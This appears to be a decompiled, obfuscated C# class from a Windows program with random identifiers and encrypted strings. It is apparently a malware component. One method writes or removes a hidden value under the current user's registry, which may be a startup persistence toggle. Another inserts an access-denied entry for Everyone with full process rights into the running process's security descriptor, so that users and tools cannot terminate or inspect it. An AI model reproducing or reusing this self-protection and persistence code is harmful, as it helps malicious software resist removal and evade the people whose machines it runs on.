using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace AFBGXefvzhgrS;

internal sealed class CgsnuVvGNPsqm
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr oYEOZfVsxoPyTEV, int OINcXODUCSMb, [Out] byte[] UUKphZdDEQ, uint lNUawPgoEaNSHeh, out uint BXohQbTVXppWX);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr ysSzcdGAnTT, int jwSPfHytxoSEZi, [In] byte[] uJAqYUTZNUb);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void OXQRoFdxvuLMp(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(getString_0(107390805));
			if (bool_0 && registryKey.GetValue(getString_0(107390248)) != null)
			{
				registryKey.DeleteValue(getString_0(107390248));
			}
			else
			{
				registryKey.SetValue(getString_0(107390248), getString_0(107391094));
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor WnGEQqkoWVQQnaG(IntPtr intptr_0)
	{
		byte[] uUKphZdDEQ = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, uUKphZdDEQ, 0u, out var BXohQbTVXppWX);
		if ((long)BXohQbTVXppWX > 32767L)
		{
			throw new Win32Exception();
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, uUKphZdDEQ = new byte[BXohQbTVXppWX], BXohQbTVXppWX, out BXohQbTVXppWX))
		{
			throw new Win32Exception();
		}
		return new RawSecurityDescriptor(uUKphZdDEQ, 0);
	}

	private void vgRNqrnPMdnT(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		if (!SetKernelObjectSecurity(intptr_0, 4, array))
		{
			throw new Win32Exception();
		}
	}

	public void OZZKZBqadwY()
	{
		IntPtr currentProcess = GetCurrentProcess();
		RawSecurityDescriptor rawSecurityDescriptor = WnGEQqkoWVQQnaG(currentProcess);
		rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
		vgRNqrnPMdnT(currentProcess, rawSecurityDescriptor);
	}

	static CgsnuVvGNPsqm()
	{
		Strings.CreateGetStringDelegate(typeof(CgsnuVvGNPsqm));
	}
}
